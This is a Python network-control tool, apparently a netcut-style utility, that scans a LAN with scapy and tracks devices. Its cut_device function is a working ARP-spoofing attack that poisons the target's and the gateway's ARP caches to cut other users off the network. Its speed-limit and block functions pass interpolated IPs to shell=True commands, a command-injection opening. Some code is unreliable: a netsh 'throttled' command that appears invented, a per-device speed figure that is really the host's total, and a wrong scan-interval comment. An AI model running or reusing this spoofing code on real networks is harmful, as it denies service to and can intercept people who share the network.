import platform
import psutil
import subprocess
import logging
import time
import socket
from scapy.all import ARP, Ether, srp, send
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
import json
from datetime import datetime
import ifaddr
import requests
import threading
import queue
import os
from scapy.layers.l2 import arping
from scapy.sendrecv import srloop
from scapy.arch import get_if_hwaddr

@dataclass
class Device:
    ip: str
    mac: str
    hostname: Optional[str] = None
    vendor: Optional[str] = None
    device_type: Optional[str] = None
    signal_strength: Optional[int] = None
    connection_type: str = "WiFi"
    status: str = "active"
    speed_limit: Optional[float] = None
    current_speed: float = 0.0
    last_seen: datetime = None
    is_protected: bool = False
    is_blocked: bool = False
    attack_status: str = "none"  # none, scanning, cutting

    def __post_init__(self):
        if self.last_seen is None:
            self.last_seen = datetime.now()


class NetworkController:
    def __init__(self):
        self.os_type = platform.system()
        self.devices: Dict[str, Device] = {}
        self.mac_vendor_cache: Dict[str, str] = {}
        self.setup_logging()
        self._stop_event = threading.Event()
        self.monitoring_thread = None
        self.attack_threads: Dict[str, threading.Thread] = {}
        self.protected_devices: List[str] = []
        self._gateway_mac = None
        self._gateway_ip = None
        
        if self.os_type == "Windows":
            self.ipconfig_path = self._get_windows_command_path("ipconfig.exe")
            self.netsh_path = self._get_windows_command_path("netsh.exe")
            self.arp_path = self._get_windows_command_path("arp.exe")
            
    def _get_windows_command_path(self, command):
        """Get full path for Windows system commands"""
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        command_path = os.path.join(system32, command)
        return command_path if os.path.exists(command_path) else command

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('networkmonitor.log'),
                logging.StreamHandler()
            ]
        )
    
    def _get_gateway_info(self) -> Tuple[str, str]:
        """Get gateway IP and MAC address"""
        try:
            if self.os_type == "Windows":
                # Get default gateway IP
                output = subprocess.check_output([self.ipconfig_path], 
                                              text=True,
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                gateway_ip = None
                for line in output.split('\n'):
                    if "Default Gateway" in line:
                        gateway_ip = line.split(":")[-1].strip()
                        break
                
                if gateway_ip:
                    # Get gateway MAC using ARP
                    arp_output = subprocess.check_output([self.arp_path, "-a"], 
                                                       text=True,
                                                       creationflags=subprocess.CREATE_NO_WINDOW)
                    for line in arp_output.split('\n'):
                        if gateway_ip in line:
                            mac = line.split()[-1].strip()
                            return gateway_ip, mac
            else:
                # Linux/MacOS implementation
                gateway_ip = subprocess.check_output("ip route | grep default | cut -d' ' -f3", 
                                                  shell=True).decode().strip()
                if gateway_ip:
                    result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip), 
                               timeout=2, verbose=False)[0]
                    if result:
                        return gateway_ip, result[0][1].hwsrc

        except Exception as e:
            logging.error(f"Error getting gateway info: {e}")
        return None, None

    def protect_device(self, ip: str) -> bool:
        """Enable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = True
                self.protected_devices.append(ip)
                # Start ARP spoofing protection
                self._start_protection(ip, device.mac)
                return True
            return False
        except Exception as e:
            logging.error(f"Error protecting device: {e}")
            return False

    def unprotect_device(self, ip: str) -> bool:
        """Disable protection for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.is_protected = False
                if ip in self.protected_devices:
                    self.protected_devices.remove(ip)
                return True
            return False
        except Exception as e:
            logging.error(f"Error unprotecting device: {e}")
            return False

    def _start_protection(self, ip: str, mac: str):
        """Start ARP spoofing protection for a device"""
        def protection_loop():
            try:
                gateway_ip, gateway_mac = self._get_gateway_info()
                if not gateway_ip or not gateway_mac:
                    return
                
                # Send gratuitous ARP responses to maintain correct ARP tables
                while ip in self.protected_devices:
                    # Send ARP to device with correct gateway info
                    self._send_arp(ip, mac, gateway_ip, gateway_mac)
                    # Send ARP to gateway with correct device info
                    self._send_arp(gateway_ip, gateway_mac, ip, mac)
                    time.sleep(1)
            except Exception as e:
                logging.error(f"Error in protection loop: {e}")

        thread = threading.Thread(target=protection_loop)
        thread.daemon = True
        thread.start()

    def cut_device(self, ip: str) -> bool:
        """Cut network access for a device using ARP spoofing"""
        try:
            device = self.devices.get(ip)
            if not device or device.is_protected:
                return False

            device.attack_status = "cutting"
            
            def attack_loop():
                try:
                    gateway_ip, gateway_mac = self._get_gateway_info()
                    if not gateway_ip or not gateway_mac:
                        return
                    
                    # Get our interface MAC
                    iface = self.get_default_interface()
                    our_mac = get_if_hwaddr(iface)
                    
                    while device.attack_status == "cutting":
                        # Send spoofed ARP to target
                        self._send_arp(ip, device.mac, gateway_ip, our_mac)
                        # Send spoofed ARP to gateway
                        self._send_arp(gateway_ip, gateway_mac, ip, our_mac)
                        time.sleep(1)
                        
                except Exception as e:
                    logging.error(f"Error in attack loop: {e}")
                finally:
                    device.attack_status = "none"
                    
            if ip in self.attack_threads:
                self.stop_cut(ip)
                
            thread = threading.Thread(target=attack_loop)
            thread.daemon = True
            thread.start()
            self.attack_threads[ip] = thread
            
            return True
        except Exception as e:
            logging.error(f"Error cutting device: {e}")
            return False

    def stop_cut(self, ip: str) -> bool:
        """Stop network cut for a device"""
        try:
            device = self.devices.get(ip)
            if device:
                device.attack_status = "none"
                if ip in self.attack_threads:
                    self.attack_threads[ip].join(timeout=2)
                    del self.attack_threads[ip]
                    
                # Restore correct ARP entries
                gateway_ip, gateway_mac = self._get_gateway_info()
                if gateway_ip and gateway_mac:
                    self._send_arp(ip, device.mac, gateway_ip, gateway_mac)
                    self._send_arp(gateway_ip, gateway_mac, ip, device.mac)
                    
                return True
            return False
        except Exception as e:
            logging.error(f"Error stopping cut: {e}")
            return False

    def _send_arp(self, target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str):
        """Send ARP packet with specified addresses"""
        try:
            arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            send(arp, verbose=False)
        except Exception as e:
            logging.error(f"Error sending ARP: {e}")

    def get_interfaces(self) -> List[Dict]:
        """Get all network interfaces"""
        interfaces = []
        adapters = ifaddr.get_adapters()
        
        for adapter in adapters:
            for ip in adapter.ips:
                # Only handle IPv4
                if isinstance(ip.ip, str):
                    interfaces.append({
                        'name': adapter.nice_name,
                        'ip': ip.ip,
                        'network_mask': ip.network_bits if hasattr(ip, 'network_bits') else 24,
                        'stats': None
                    })
        return interfaces

    def get_wifi_interfaces(self) -> List[str]:
        """Get list of WiFi interfaces"""
        wifi_interfaces = []
        try:
            if self.os_type == "Windows":
                output = subprocess.check_output([self.netsh_path, "wlan", "show", "interfaces"], 
                                              text=True, 
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                if "Name" in output:
                    for line in output.split('\n'):
                        if "Name" in line:
                            wifi_interfaces.append(line.split(":")[1].strip())
            else:  # Linux/MacOS
                print("[DEBUG] Running on Linux/MacOS")
            interfaces = self.get_interfaces()
            print(f"[DEBUG] interfaces found: {interfaces}")  # Debug interfaces list
            for interface in interfaces:
                print(f"[DEBUG] Checking interface: {interface}")
                if interface['name'].startswith(('wlan', 'wifi', 'wi-fi', 'wl','wpl')):
                    wifi_interfaces.append(interface['name'])
        except Exception as e:
            logging.error(f"Error getting WiFi interfaces: {e}")
        return wifi_interfaces

    def get_default_interface(self) -> str:
        """Get default network interface"""
        try:
            if self.os_type == "Windows":
                output = subprocess.check_output([self.ipconfig_path], 
                                              text=True, 
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                for line in output.split('\n'):
                    if "Wireless LAN adapter" in line:
                        return line.split("adapter")[-1].strip().strip(':')
                    # Fallback to first Ethernet adapter if no wireless
                    elif "Ethernet adapter" in line:
                        return line.split("adapter")[-1].strip().strip(':')
            else:
                # Get default interface on Linux/MacOS using ifaddr
                adapters = ifaddr.get_adapters()
                for adapter in adapters:
                    for ip in adapter.ips:
                        if isinstance(ip.ip, str) and not ip.ip.startswith('127.'):
                            return adapter.nice_name
        except Exception as e:
            logging.error(f"Error getting default interface: {e}")
        return None

    def get_interface_ip(self, interface: str) -> str:
        """Get IP address of specified interface"""
        try:
            if self.os_type == "Windows":
                output = subprocess.check_output([self.ipconfig_path], 
                                              text=True,
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                current_adapter = None
                for line in output.split('\n'):
                    if interface in line:
                        current_adapter = interface
                    elif current_adapter and "IPv4 Address" in line:
                        return line.split(":")[-1].strip().strip('(Preferred)')
            else:
                addrs = ifaddr.get_adapters()
                for adapter in addrs:
                    if adapter.nice_name == interface:
                        for ip in adapter.ips:
                            if isinstance(ip.ip, str):
                                return ip.ip
        except Exception as e:
            logging.error(f"Error getting interface IP: {e}")
        return None

    def get_connected_devices(self, interface: str = None) -> List[Device]:
        """Scan network for connected devices"""
        try:
            if not interface:
                interface = self.get_default_interface()
            
            if not interface:
                raise Exception("No valid network interface found")

            # Get subnet for scanning
            ip = self.get_interface_ip(interface)
            if not ip:
                raise Exception(f"Could not get IP for interface {interface}")

            subnet = self.get_subnet(ip)
            logging.info(f"Scanning subnet: {subnet}/24")

            # Perform ARP scan
            arp = ARP(pdst=f"{subnet}/24")
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            result = srp(packet, timeout=3, verbose=0, iface=interface)[0]
            
            current_time = datetime.now()
            
            for sent, received in result:
                ip_addr = received.psrc
                mac_addr = received.hwsrc.upper()
                
                # Get device details
                hostname = self.get_hostname(ip_addr)
                vendor = self.get_vendor(mac_addr)
                signal_strength = self.get_signal_strength(mac_addr)
                device_type = self.guess_device_type(hostname, vendor)
                
                device = Device(
                    ip=ip_addr,
                    mac=mac_addr,
                    hostname=hostname,
                    vendor=vendor,
                    device_type=device_type,
                    signal_strength=signal_strength,
                    last_seen=current_time
                )
                
                self.devices[ip_addr] = device

            # Update status of devices not seen in this scan
            for ip, device in self.devices.items():
                if device.last_seen != current_time:
                    device.status = "inactive"

            return list(self.devices.values())

        except Exception as e:
            logging.error(f"Error scanning network: {e}")
            return []

    def get_subnet(self, ip: str) -> str:
        """Get subnet from IP address"""
        try:
            return '.'.join(ip.split('.')[:-1]) + '.0'
        except Exception as e:
            logging.error(f"Error getting subnet: {e}")
            return None

    def get_hostname(self, ip: str) -> Optional[str]:
        """Get hostname for IP address"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except:
            return None

    def get_vendor(self, mac: str) -> Optional[str]:
        """Get vendor from MAC address using macvendors.com API"""
        try:
            if mac in self.mac_vendor_cache:
                return self.mac_vendor_cache[mac]

            mac = mac.replace(':', '').upper()[:6]
            response = requests.get(f'https://api.macvendors.com/{mac}')
            
            if response.status_code == 200:
                vendor = response.text
                self.mac_vendor_cache[mac] = vendor
                return vendor
        except:
            pass
        return None

    def get_signal_strength(self, mac: str) -> Optional[int]:
        """Get WiFi signal strength for device"""
        try:
            if self.os_type == "Windows":
                output = subprocess.check_output([self.netsh_path, "wlan", "show", "interfaces"], 
                                              text=True,
                                              creationflags=subprocess.CREATE_NO_WINDOW)
                if mac.replace(':', '-').upper() in output:
                    for line in output.split('\n'):
                        if "Signal" in line:
                            return int(line.split(':')[1].strip().strip('%'))
        except:
            pass
        return None

    def guess_device_type(self, hostname: str, vendor: str) -> str:
        """Guess device type based on hostname and vendor"""
        if not hostname and not vendor:
            return "Unknown"

        hostname = (hostname or "").lower()
        vendor = (vendor or "").lower()

        patterns = {
            "smartphone": ["iphone", "android", "phone", "samsung", "huawei", "xiaomi"],
            "laptop": ["laptop", "macbook", "notebook", "dell", "lenovo", "hp", "asus"],
            "tablet": ["ipad", "tablet", "kindle"],
            "smart tv": ["tv", "roku", "firestick", "chromecast", "samsung tv", "lg tv"],
            "gaming": ["playstation", "xbox", "nintendo", "ps4", "ps5"],
            "iot": ["camera", "thermostat", "doorbell", "nest", "ring", "echo", "alexa"],
            "desktop": ["desktop", "pc", "imac", "workstation"]
        }

        for device_type, keywords in patterns.items():
            if any(keyword in hostname or keyword in vendor for keyword in keywords):
                return device_type.title()

        return "Unknown"

    def start_monitoring(self):
        """Start continuous device monitoring"""
        if not self.monitoring_thread or not self.monitoring_thread.is_alive():
            self._stop_event.clear()
            self.monitoring_thread = threading.Thread(target=self._monitor_loop)
            self.monitoring_thread.daemon = True
            self.monitoring_thread.start()

    def stop_monitoring(self):
        """Stop device monitoring"""
        self._stop_event.set()
        if self.monitoring_thread:
            self.monitoring_thread.join()

    def _monitor_loop(self):
        """Background monitoring loop"""
        while not self._stop_event.is_set():
            try:
                self.get_connected_devices()
                self._update_device_speeds()
                time.sleep(120)  # Scan every 5 seconds
            except Exception as e:
                logging.error(f"Error in monitoring loop: {e}")
                time.sleep(120)

    def _update_device_speeds(self):
        """Update current speeds for all devices"""
        try:
            stats = psutil.net_io_counters(pernic=True)
            for ip, device in self.devices.items():
                if device.status == "active":
                    total_bytes = sum(s.bytes_sent + s.bytes_recv for s in stats.values())
                    device.current_speed = total_bytes / 1_000_000  # Convert to Mbps
        except Exception as e:
            logging.error(f"Error updating device speeds: {e}")

    def get_device_details(self, ip: str) -> Optional[Dict]:
        """Get detailed information about a specific device"""
        device = self.devices.get(ip)
        if device:
            return {
                "ip": device.ip,
                "mac": device.mac,
                "hostname": device.hostname,
                "vendor": device.vendor,
                "device_type": device.device_type,
                "signal_strength": device.signal_strength,
                "connection_type": device.connection_type,
                "status": device.status,
                "current_speed": device.current_speed,
                "speed_limit": device.speed_limit,
                "last_seen": device.last_seen.isoformat()
            }
        return None

    def get_network_summary(self) -> Dict:
        """Get summary of network devices"""
        active_devices = [d for d in self.devices.values() if d.status == "active"]
        return {
            "total_devices": len(self.devices),
            "active_devices": len(active_devices),
            "device_types": {
                device_type: len([d for d in active_devices if d.device_type == device_type])
                for device_type in set(d.device_type for d in active_devices)
            },
            "total_bandwidth": sum(d.current_speed for d in active_devices)
        }
    def limit_device_speed(self, ip, speed_limit):
        """Limit device speed (in Mbps)"""
        try:
            # Implement speed limiting using `tc` command (Linux) or `netsh` (Windows)
            if self.os_type == "Windows":
                # Windows implementation (simplified, may require admin privileges)
                command = f"netsh interface set interface {ip} throttled {speed_limit}"
                subprocess.check_output(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Linux implementation (simplified, may require sudo)
                command = f"tc qdisc add dev {self.get_default_interface()} handle ffff: ingress; tc filter add dev {self.get_default_interface()} parent ffff: protocol ip handle 1 u32 match ip dst {ip} flowid 1:1; tc qdisc add dev {self.get_default_interface()} parent 1:1 handle 10: tbf rate {speed_limit}mbit burst 100kb latency 50ms"
                subprocess.check_output(command, shell=True)
            return True
        except Exception as e:
            logging.error(f"Error limiting device speed: {e}")
            return False

    def block_device(self, ip):
        """Block (Disconnect) a device"""
        try:
            # Implement device blocking using `iptables` (Linux) or `netsh` (Windows)
            if self.os_type == "Windows":
                # Windows implementation (simplified, may require admin privileges)
                command = f"netsh advfirewall firewall add rule name=Block_{ip} dir=in interface=any action=block remoteip={ip}"
                subprocess.check_output(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Linux implementation (simplified, may require sudo)
                command = f"iptables -A INPUT -s {ip} -j DROP"
                subprocess.check_output(command, shell=True)
            return True
        except Exception as e:
            logging.error(f"Error blocking device: {e}")
            return False

    def rename_device(self, ip, new_name):
        """Rename a device (update hostname)"""
        try:
            device = self.devices.get(ip)
            if device:
                device.hostname = new_name
                return True
            return False
        except Exception as e:
            logging.error(f"Error renaming device: {e}")
            return False